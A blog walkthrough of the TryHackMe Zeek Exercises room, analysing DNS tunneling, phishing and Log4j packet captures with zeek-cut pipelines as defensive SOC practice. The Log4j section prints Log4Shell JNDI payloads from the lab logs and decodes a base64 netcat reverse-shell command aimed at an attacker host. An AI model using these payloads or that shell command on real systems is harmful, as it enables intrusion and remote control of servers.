---
title: "[SOC-Level 1] Tryhackme - Zeek Exercises"
date: 2024-10-07 12:00:00 -500 
categories: [SOC-Level 1 - Tryhackme, Zeek Exercises]
tags: [soc,tryhackme,blueteam,zeek]
author: Christoph K
---
[TryHackMe- ZEEK Exercises ](https://tryhackme.com/r/room/zeekbroexercises)


## Task 1: Anomalous DNS Activity

- Investigate the dns-tunneling.pcap file. Investigate the dns.log file. What is the number of DNS records linked to the IPv6 address?
- Investigate the conn.log file. What is the longest connection duration?
- Investigate the dns.log file. Filter all unique DNS queries. What is the number of unique domain queries?
- There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let's find out which hosts are involved in this activity. Investigate the conn.log file. What is the IP address of the source host?

### Investigate the dns-tunneling.pcap file. Investigate the dns.log file. What is the number of DNS records linked to the IPv6 address?

Lets investigate our `pcap` file:

`zeek -C -r dns-tunneling.pcap`

We need IPv6 addresses. We can use `qtype_name` to filter the log to DNS types. We need to find `AAAA`. We use `sort` and `uniq` with flag `-c` for counting.


`cat dns.log |zeek-cut qtype_name |sort |uniq -c`


And we get this:

``` bash
root@ip-10-10-162-16:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# cat dns.log |zeek-cut qtype_name |sort |uniq -c
     11 A
    320 AAAA
   2232 CNAME
   2314 MX
     23 PTR
   2347 TXT
```

Answer: `320`


### Investigate the conn.log file. What is the longest connection duration?

For the next question, we filter the `conn.log` file and we are looking für `type duration`.

```bash
root@ip-10-10-162-16:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# cat conn.log |zeek-cut id.orig_h duration |sort -r |head
fe80::202a:f0b1:7d9c:bd9e	-
10.20.57.3	9.420791
10.20.57.3	7.835490
10.20.57.3	4.238265
10.20.57.3	3.445874
10.20.57.3	3.298156
10.20.57.3	3.029706
```

Answer: `9.420791`



### Investigate the dns.log file. Filter all unique DNS queries. What is the number of unique domain queries?

This one is a little bit more difficult to filter. We know we need `type query`. 

What did I do: 

`cat dns.log | zeek-cut query |rev | cut -d '.' -f 1-2 | rev | sort |uniq`


- `rev` means reverse, we had a log of `1234.1234.cisco-update.com` and we get `moc.etadpu-ocsic.4321.4321`
- `cut` with `-d` and `-f 1-2` we cut out the first two fields after reversing the domain names
- we `rev` again that we can read it
- we delete all the duplicates



```bash
root@ip-10-10-162-16:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# cat dns.log | zeek-cut query |rev | cut -d '.' -f 1-2 | rev | sort |uniq
_tcp.local
cisco-update.com
in-addr.arpa
ip6.arpa
rhodes.edu
ubuntu.com
```

Answer: `6`

### There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let's find out which hosts are involved in this activity. Investigate the conn.log file. What is the IP address of the source host?

We filter for `type id.orig_h`

```bash

b792016cb1a0659b4f36ae16cb817ae96e.cisco-update.com	10.20.57.3
e12e018ea0c150837d27e116aa0971241e.cisco-update.com	10.20.57.3
4b41016cb1ed91806da03916ccc2f2d938.cisco-update.com	10.20.57.3
root@ip-10-10-162-16:/home/ubuntu/Desktop/Exercise-Files/anomalous-dns# cat dns.log | zeek-cut query id.orig_h 

```

Answer: `10.20.57.3`


## Task 2: Phishing

- Investigate the logs. What is the suspicious source address? Enter your answer in defanged format.
- Investigate the http.log file. Which domain address were the malicious files downloaded from? Enter your answer in defanged format.
- Investigate the malicious document in VirusTotal. What kind of file is associated with the malicious document?
- Investigate the extracted malicious .exe file. What is the given file name in Virustotal?
- Investigate the malicious .exe file in VirusTotal. What is the contacted domain name? Enter your answer in defanged format.
- Investigate the http.log file. What is the request name of the downloaded malicious .exe file?

### Investigate the logs. What is the suspicious source address? Enter your answer in defanged format.


We check the `conn.log`for suspicious IP addresses: 

``` bash
root@ip-10-10-162-16:/home/ubuntu/Desktop/Exercise-Files/phishing# cat conn.log |zeek-cut id.orig_h |sort |uniq -c
     50 10.6.27.102
```
Okay, lets `defang` this IP. (Cyberchef) 


Anser: `10[.]6[.]27[.]102`

### Investigate the http.log file. Which domain address were the malicious files downloaded from? Enter your answer in defanged format.


We filter for `type id.orig_h` `host` and `uri` to find out, from which domain was the file downloaded from.

```bash
root@ip-10-10-162-16:/home/ubuntu/Desktop/Exercise-Files/phishing# cat http.log |zeek-cut id.orig_h host uri
10.6.27.102	www.msftncsi.com	/ncsi.txt
10.6.27.102	smart-fax.com	/Documents/Invoice&MSO-Request.doc
10.6.27.102	smart-fax.com	/knr.exe
``` 


Anser: `smart-fax[.]com`

### Investigate the malicious document in VirusTotal. What kind of file is associated with the malicious document?

For that we need our module `hash-demo.zeek`. We start the `pcap` investigation again with:

`zeek -Cr phishing.pcap hash-demo.zeek´` 

and filter the log:

```bash

root@ip-10-10-162-16:/home/ubuntu/Desktop/Exercise-Files/phishing# cat files.log |zeek-cut md5 filename mime_type
cd5a4d3fdd5bffc16bf959ef75cf37bc	-	text/plain
b5243ec1df7d1d5304189e7db2744128	-	application/msword
cc28e40b46237ab6d5282199ef78c464	-	application/x-dosexec
```

Our `md5` for the suspicious file is `cc28e40b46237ab6d5282199ef78c464`. We have to check it in Virustotal. After a bit searching in `Relation` the answer is `vba`.

Answer: `VBA`

### Investigate the extracted malicious .exe file. What is the given file name in Virustotal?

This is easy, its directly below the `Score`


Anser: `PleaseWaitWindow.exe`

### Investigate the malicious .exe file in VirusTotal. What is the contacted domain name? Enter your answer in defanged format.

Further analysis in Virustotal:

![Virustotal](assets/img/tryhackme/zeek-challenge/zeek-01.png "Virustotal")

And we `defang` again.


Anser: `hopto[.]org`

### Investigate the http.log file. What is the request name of the downloaded malicious .exe file?

We filter for `uri` and have the name of our file:
```bash
root@ip-10-10-162-16:/home/ubuntu/Desktop/Exercise-Files/phishing# cat http.log |zeek-cut uri
/ncsi.txt
/Documents/Invoice&MSO-Request.doc
/knr.exe
```

Anser: `knr.exe`

## Task 3: Log4J

- Investigate the log4shell.pcapng file with detection-log4j.zeek script. Investigate the signature.log file. What is the number of signature hits?
- Investigate the http.log file. Which tool is used for scanning?
- Investigate the http.log file. What is the extension of the exploit file?
- Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file?

### Investigate the log4shell.pcapng file with detection-log4j.zeek script. Investigate the signature.log file. What is the number of signature hits?


And we start again `zeek` with our module to detect `log4j` signatures:

`zeek -Cr log4shell.pcapng detection-log4j.zeek `

and we filter for `event_msg`and `note`:

```bash
root@ip-10-10-162-16:/home/ubuntu/Desktop/Exercise-Files/log4j# cat signatures.log |zeek-cut note  event_msg |nl
     1	Signatures::Sensitive_Signature	192.168.56.102: log4j_javaclassname_tcp
     2	Signatures::Sensitive_Signature	192.168.56.102: log4j_javaclassname_tcp
     3	Signatures::Sensitive_Signature	192.168.56.102: log4j_javaclassname_tcp
```

Anser: `3`


### Investigate the http.log file. Which tool is used for scanning?


We filter the `http.log` for `user_agent` and delete the duplicates.

```bash

root@ip-10-10-162-16:/home/ubuntu/Desktop/Exercise-Files/log4j# cat http.log |zeek-cut user_agent |sort |uniq
${jndi:ldap://127.0.0.1:1389}
${jndi:ldap://192.168.56.102:389/test}
${jndi:ldap://192.168.56.102:389}
${jndi:ldap://192.168.56.102}
Java/1.8.0_181
Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
SecurityNik Testing
```
Scanning tool is `nmap`

Answer: `Nmap`

### Investigate the http.log file. What is the extension of the exploit file?

We filter for `type uri`:

```bash

root@ip-10-10-162-16:/home/ubuntu/Desktop/Exercise-Files/log4j# cat http.log |zeek-cut uri |sort |uniq
/
/Exploit6HHc3BcVzI.class
/ExploitQ8v7ygBW4i.class
/ExploitSMMZvT8GXL.class
```

Anser: `.class`

### Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file?


We filter for `value` in our `log4j.log`:

```bash
root@ip-10-10-162-16:/home/ubuntu/Desktop/Exercise-Files/log4j# cat log4j.log |zeek-cut value |sort|uniq
${jndi:ldap://127.0.0.1:1389}
${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==}
${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==}
${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}
${jndi:ldap://192.168.56.102:389/test}
${jndi:ldap://192.168.56.102:389}

```
And we extract the `Base64` lines and translate them:

```bash
bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==}
d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==}
dG91Y2ggL3RtcC9wd25lZAo=}
```

Translated text: 

    nc 192.168.56.102 80 -e /bin/sh -vvv
    which nc > /tmp/pwned
    touch /tmp/pwned



Answer:`pwned`


